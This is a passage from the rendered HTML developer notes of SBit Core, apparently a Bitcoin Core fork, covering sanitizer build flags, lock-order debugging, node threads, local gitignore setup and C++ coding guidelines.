aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>or using a graphical tool like <a href="https://github.com/KDAB/hotspot" target="_blank" rel="noopener noreferrer">Hotspot</a>.</p><p>See the functional test documentation for how to invoke perf within tests.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="sanitizers">Sanitizers<a class="hash-link" href="#sanitizers" title="Direct link to heading">​</a></h3><p>SBit Core can be compiled with various &quot;sanitizers&quot; enabled, which add
instrumentation for issues regarding things like memory safety, thread race
conditions, or undefined behavior. This is controlled with the
<code>--with-sanitizers</code> configure flag, which should be a comma separated list of
sanitizers to enable. The sanitizer list should correspond to supported
<code>-fsanitize=</code> options in your compiler. These sanitizers have runtime overhead,
so they are most useful when testing changes or producing debugging builds.</p><p>Some examples:</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"># Enable both the address sanitizer and the undefined behavior sanitizer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">./configure --with-sanitizers</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">address,undefined</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)"># Enable the thread sanitizer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">./configure --with-sanitizers</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">thread</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>If you are compiling with GCC you will typically need to install corresponding
&quot;san&quot; libraries to actually compile with these flags, e.g. libasan for the
address sanitizer, libtsan for the thread sanitizer, and libubsan for the
undefined sanitizer. If you are missing required libraries, the configure script
will fail with a linker error when testing the sanitizer flags.</p><p>The test suite should pass cleanly with the <code>thread</code> and <code>undefined</code> sanitizers,
but there are a number of known problems when using the <code>address</code> sanitizer. The
address sanitizer is known to fail in
<a href="https://github.com/SBit-Project/src/crypto/sha256_sse4.cpp" target="_blank" rel="noopener noreferrer">sha256_sse4::Transform</a> which makes it unusable
unless you also use <code>--disable-asm</code> when running configure. We would like to fix
sanitizer issues, so please send pull requests if you can fix any errors found
by the address sanitizer (or any other sanitizer).</p><p>Not all sanitizer options can be enabled at the same time, e.g. trying to build
with <code>--with-sanitizers=address,thread</code> will fail in the configure script as
these sanitizers are mutually incompatible. Refer to your compiler manual to
learn more about these options and which sanitizers are supported by your
compiler.</p><p>Additional resources:</p><ul><li><a href="https://clang.llvm.org/docs/AddressSanitizer.html" target="_blank" rel="noopener noreferrer">AddressSanitizer</a></li><li><a href="https://clang.llvm.org/docs/LeakSanitizer.html" target="_blank" rel="noopener noreferrer">LeakSanitizer</a></li><li><a href="https://clang.llvm.org/docs/MemorySanitizer.html" target="_blank" rel="noopener noreferrer">MemorySanitizer</a></li><li><a href="https://clang.llvm.org/docs/ThreadSanitizer.html" target="_blank" rel="noopener noreferrer">ThreadSanitizer</a></li><li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html" target="_blank" rel="noopener noreferrer">UndefinedBehaviorSanitizer</a></li><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html" target="_blank" rel="noopener noreferrer">GCC Instrumentation Options</a></li><li><a href="https://github.com/google/sanitizers/wiki" target="_blank" rel="noopener noreferrer">Google Sanitizers Wiki</a></li><li><a href="https://github.com/bitcoin/bitcoin/issues/12691" target="_blank" rel="noopener noreferrer">Issue #12691: Enable -fsanitize flags in Travis</a></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="lockingmutex-usage-notes">Locking/mutex usage notes<a class="hash-link" href="#lockingmutex-usage-notes" title="Direct link to heading">​</a></h2><p>The code is multi-threaded and uses mutexes and the
<code>LOCK</code> and <code>TRY_LOCK</code> macros to protect data structures.</p><p>Deadlocks due to inconsistent lock ordering (thread 1 locks <code>cs_main</code> and then
<code>cs_wallet</code>, while thread 2 locks them in the opposite order: result, deadlock
as each waits for the other to release its lock) are a problem. Compile with
<code>-DDEBUG_LOCKORDER</code> (or use <code>--enable-debug</code>) to get lock order inconsistencies
reported in the <code>debug.log</code> file.</p><p>Re-architecting the core code so there are better-defined interfaces
between the various components is a goal, with any necessary locking
done by the components (e.g. see the self-contained <code>FillableSigningProvider</code> class
and its <code>cs_KeyStore</code> lock for example).</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="threads">Threads<a class="hash-link" href="#threads" title="Direct link to heading">​</a></h2><ul><li><p><a href="https://doxygen.bitcoincore.org/bitcoind_8cpp.html#a0ddf1224851353fc92bfbff6f499fa97" target="_blank" rel="noopener noreferrer">Main thread (<code>bitcoind</code>)</a>
: Started from <code>main()</code> in <code>bitcoind.cpp</code>. Responsible for starting up and
shutting down the application.</p></li><li><p><a href="https://doxygen.bitcoincore.org/init_8cpp.html#ae9e290a0e829ec0198518de2eda579d1" target="_blank" rel="noopener noreferrer">ThreadImport (<code>b-loadblk</code>)</a>
: Loads blocks from <code>blk*.dat</code> files or <code>-loadblock=&lt;file&gt;</code> on startup.</p></li><li><p><a href="https://doxygen.bitcoincore.org/validation_8cpp.html#a925a33e7952a157922b0bbb8dab29a20" target="_blank" rel="noopener noreferrer">ThreadScriptCheck (<code>b-scriptch.x</code>)</a>
: Parallel script validation threads for transactions in blocks.</p></li><li><p><a href="https://doxygen.bitcoincore.org/httpserver_8cpp.html#abb9f6ea8819672bd9a62d3695070709c" target="_blank" rel="noopener noreferrer">ThreadHTTP (<code>b-http</code>)</a>
: Libevent thread to listen for RPC and REST connections.</p></li><li><p><a href="https://doxygen.bitcoincore.org/httpserver_8cpp.html#aa6a7bc27265043bc0193220c5ae3a55f" target="_blank" rel="noopener noreferrer">HTTP worker threads(<code>b-httpworker.x</code>)</a>
: Threads to service RPC and REST requests.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_base_index.html#a96a7407421fbf877509248bbe64f8d87" target="_blank" rel="noopener noreferrer">Indexer threads (<code>b-txindex</code>, etc)</a>
: One thread per indexer.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_c_scheduler.html#a14d2800815da93577858ea078aed1fba" target="_blank" rel="noopener noreferrer">SchedulerThread (<code>b-scheduler</code>)</a>
: Does asynchronous background tasks like dumping wallet contents, dumping
addrman and running asynchronous validationinterface callbacks.</p></li><li><p><a href="https://doxygen.bitcoincore.org/torcontrol_8cpp.html#a4faed3692d57a0d7bdbecf3b37f72de0" target="_blank" rel="noopener noreferrer">TorControlThread (<code>b-torcontrol</code>)</a>
: Libevent thread for tor connections.</p></li><li><p>Net threads:</p><ul><li><p><a href="https://doxygen.bitcoincore.org/class_c_connman.html#aacdbb7148575a31bb33bc345e2bf22a9" target="_blank" rel="noopener noreferrer">ThreadMessageHandler (<code>b-msghand</code>)</a>
: Application level message handling (sending and receiving). Almost
all net_processing and validation logic runs on this thread.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_c_connman.html#aa7c6970ed98a4a7bafbc071d24897d13" target="_blank" rel="noopener noreferrer">ThreadDNSAddressSeed (<code>b-dnsseed</code>)</a>
: Loads addresses of peers from the DNS.</p></li><li><p><a href="https://doxygen.bitcoincore.org/net_8cpp.html#a63f82a71c4169290c2db1651a9bbe249" target="_blank" rel="noopener noreferrer">ThreadMapPort (<code>b-upnp</code>)</a>
: Universal plug-and-play startup/shutdown.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_c_connman.html#a765597cbfe99c083d8fa3d61bb464e34" target="_blank" rel="noopener noreferrer">ThreadSocketHandler (<code>b-net</code>)</a>
: Sends/Receives data from peers on port 8333.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_c_connman.html#a0b787caf95e52a346a2b31a580d60a62" target="_blank" rel="noopener noreferrer">ThreadOpenAddedConnections (<code>b-addcon</code>)</a>
: Opens network connections to added nodes.</p></li><li><p><a href="https://doxygen.bitcoincore.org/class_c_connman.html#a55e9feafc3bab78e5c9d408c207faa45" target="_blank" rel="noopener noreferrer">ThreadOpenConnections (<code>b-opencon</code>)</a>
: Initiates new connections to peers.</p></li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="ignoring-ideeditor-files">Ignoring IDE/editor files<a class="hash-link" href="#ignoring-ideeditor-files" title="Direct link to heading">​</a></h2><p>In closed-source environments in which everyone uses the same IDE, it is common
to add temporary files it produces to the project-wide <code>.gitignore</code> file.</p><p>However, in open source software such as SBit Core, where everyone uses
their own editors/IDE/tools, it is less common. Only you know what files your
editor produces and this may change from version to version. The canonical way
to do this is thus to create your local gitignore. Add this to <code>~/.gitconfig</code>:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">[core]</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        excludesfile = /home/.../.gitignore_global</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>(alternatively, type the command <code>git config --global core.excludesfile ~/.gitignore_global</code>
on a terminal)</p><p>Then put your favourite tool&#x27;s temporary filenames in that file, e.g.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain"># NetBeans</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">nbproject/</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Another option is to create a per-repository excludes file <code>.git/info/exclude</code>.
These are not committed but apply only to one repository.</p><p>If a set of tools is used by the build system or scripts the repository (for
example, lcov) it is perfectly acceptable to add its files to <code>.gitignore</code>
and commit them.</p><h1>Development guidelines</h1><p>A few non-style-related recommendations for developers, as well as points to
pay attention to for reviewers of SBit Core code.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="general-sbit-core">General SBit Core<a class="hash-link" href="#general-sbit-core" title="Direct link to heading">​</a></h2><ul><li><p>New features should be exposed on RPC first, then can be made available in the GUI.</p><ul><li><em>Rationale</em>: RPC allows for better automatic testing. The test suite for
the GUI is very limited.</li></ul></li><li><p>Make sure pull requests pass Travis CI before merging.</p><ul><li><p><em>Rationale</em>: Makes sure that they pass thorough testing, and that the tester will keep passing
on the master branch. Otherwise, all new pull requests will start failing the tests, resulting in
confusion and mayhem.</p></li><li><p><em>Explanation</em>: If the test suite is to be updated for a change, this has to
be done first.</p></li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="wallet">Wallet<a class="hash-link" href="#wallet" title="Direct link to heading">​</a></h2><ul><li><p>Make sure that no crashes happen with run-time option <code>-disablewallet</code>.</p></li><li><p>Include <code>db_cxx.h</code> (BerkeleyDB header) only when <code>ENABLE_WALLET</code> is set.</p><ul><li><em>Rationale</em>: Otherwise compilation of the disable-wallet build will fail in environments without BerkeleyDB.</li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="general-c">General C++<a class="hash-link" href="#general-c" title="Direct link to heading">​</a></h2><p>For general C++ guidelines, you may refer to the <a href="https://isocpp.github.io/CppCoreGuidelines/" target="_blank" rel="noopener noreferrer">C++ Core
Guidelines</a>.</p><p>Common misconceptions are clarified in those sections:</p><ul><li><p>Passing (non-)fundamental types in the <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rf-conventional" target="_blank" rel="noopener noreferrer">C++ Core
Guideline</a>.</p></li><li><p>Assertions should not have side-effects.</p><ul><li><em>Rationale</em>: Even though the source code is set to refuse to compile
with assertions disabled, having side-effects in assertions is unexpected and
makes the code harder to understand.</li></ul></li><li><p>If you use the <code>.h</code>, you must link the <code>.cpp</code>.</p><ul><li><em>Rationale</em>: Include files define the interface for the code in implementation files. Including one but
not linking the other is confusing. Please avoid that. Moving functions from
the <code>.h</code> to the <code>.cpp</code> should not result in build errors.</li></ul></li><li><p>Use the RAII (Resource Acquisition Is Initialization) paradigm where possible. For example, by using
<code>unique_ptr</code> for allocations in a function.</p><ul><li><em>Rationale</em>: This avoids memory and resource leaks, and ensures exception safety.</li></ul></li><li><p>Use <code>MakeUnique()</code> to construct objects owned by <code>unique_ptr</code>s.</p><ul><li><em>Rationale</em>: <code>MakeUnique</code> is concise and ensures exception safety in complex expressions.
<code>MakeUnique</code> is a temporary project local implementation of <code>std::make_unique</code> (C++14).</li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="c-data-structures">C++ data structures<a class="hash-link" href="#c-data-structures" title="Direct link to heading">​</a></h2><ul><li><p>Never use the <code>std::map []</code> syntax when reading from a map, but instead use <code>.find()</code>.</p><ul><li><em>Rationale</em>: <code>[]</code> does an insert (of the default element) if the item doesn&#x27;t
exist in the map yet. This has resulted in memory leaks in the past, as well as
race conditions (expecting read-read behavior). Using <code>[]</code> is fine for <em>writing</em> to a map.</li></ul></li><li><p>Do not compare an iterator from one data structure with an iterator of
another data structure (even if of the same type).</p><ul><li><em>Rationale</em>: Behavior is undefined. In C++ parlor this means &quot;may reformat
the universe&quot;, in practice this has resulted in at least one hard-to-debug crash bug.</li></ul></li><li><p>Watch out for out-of-bounds vector access. <code>&amp;vch[vch.size()]</code> is illegal,
including <code>&amp;vch[0]</code> for an empty vector. Use <code>vch.data()</code> and <code>vch.data() +
vch.size()</code> instead.</p></li><li><p>Vector bounds checking is only enabled in debug mode. Do not rely on it.</p></li><li><p>Initialize all non-static class members where they are defined.
If this is skipped for a good reason (i.e., optimization on the critical
path), add an explicit comment about this.</p><ul><li><em>Rationale</em>: Ensure determinism by avoiding accidental use of uninitialized
values. Also, static analyzers balk about this.
Initializing the members in the declaration makes it easy to
spot uninitialized ones.</li></ul></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">A</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">uint32_t</span><span class="token plain"> m_count</span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><ul><li><p>By default, declare constructors <code>explicit</code>.</p><ul><li><em>Rationale</em>: This is a precaution to avoid unintended
<a href="https://en.cppreference.com/w/cpp/language/converting_constructor" target="_blank" rel="noopener noreferrer">conversions</a>.</li></ul></li><li><p>Use explicitly signed or unsigned <code>char</code>s, or even better <code>uint8_t</code> and
<code>int8_t</code>. Do not use bare <code>char</code> unless it is to pass to a third-party API.
This type can be signed or unsigned depending on the architecture, which can
lead to interoperability problems or dangerous conditions such as
out-of-bounds array accesses.</p></li><li><p>Prefer explicit constructions over implicit ones that rely on &#x27;magical&#x27; C++ behavior.</p><ul><li><em>Rationale</em>: Easier to understand what is happening, thus easier to spot mistakes, even for those
that are not language lawyers.</li></ul></li><li><p>Use <code>Span</code> as function argument when it can operate on any range-like container.</p><ul><li><em>Rationale</em>: Compared to <code>Foo(const vector&lt;int&gt;&amp;)</code> this avoids the need for a (potentially expensive)
conversion to vector if the caller happens to have the input stored in another type of container.
However, be aware of the pitfalls documented in <a href="https://github.com/SBit-Project/sbit/src/span.h" target="_blank" rel="noopener noreferrer">span.h</a>.</li></ul></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">Foo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">Span</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> data</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">vector</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> vec</span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token number" style="color:rgb(181, 206, 168)">1</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token number" style="color:rgb(181, 206, 168)">2</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token number" style="color:rgb(181, 206, 168)">3</span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">Foo</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">vec</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><ul><li><p>Prefer <code>enum class</code> (scoped enumerations) over <code>enum</code> (traditional enumerations) where possible.</p><ul><li><em>Rationale</em>: Scoped enumerations avoid two potential pitfalls/problems with traditional C++ enumerations: implicit conversions to <code>int</code>, and name clashes due to enumerators being exported to the surrounding scope.</li></ul></li><li><p><code>switch</code> statement on an enumeration example:</p></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">enum</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">Tabs</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    INFO</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    CONSOLE</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    GRAPH</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    PEERS</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">GetInt</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">Tabs tab</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">switch</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">tab</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">case</span><span class="token plain"> Tabs</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">INFO</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">case</span><span class="token plain"> Tabs</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">CONSOLE</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">1</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">case</span><span class="token plain"> Tabs</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">GRAPH</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">2</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">case</span><span class="token plain"> Tabs</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">PEERS</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">3</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><span class="token comment" style="color:rgb(106, 153, 85)">// no default case, so the compiler can warn about missing cases</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">assert</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p><em>Rationale</em>: The comment documents skipping <code>default:</code> label, and it complies with <code>clang-format</code> rules. The assertion prevents firing of <code>-Wreturn-type</code> warning on some compilers.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="strings-and-formatting">Strings and formatting<a class="hash-link" href="#strings-and-formatting" title="Direct link to heading">​</a></h2><ul><li><p>Be careful of <code>LogPrint</code> versus <code>LogPrintf</code>. <code>LogPrint</code> takes a <code>category</code> argument, <code>LogPrintf</code> does not.</p><ul><li><em>Rationale</em>: Confusion of these can result in runtime exceptions due to
formatting mismatch, and it is easy to get wrong because of subtly similar naming.</li></ul></li><li><p>Use <code>std::string</code>, avoid C string manipulation functions.</p><ul><li><em>Rationale</em>: C++ string handling is marginally safer, less scope for
buffer overflows, and surprises with <code>\0</code> characters. Also, some C string manipulations
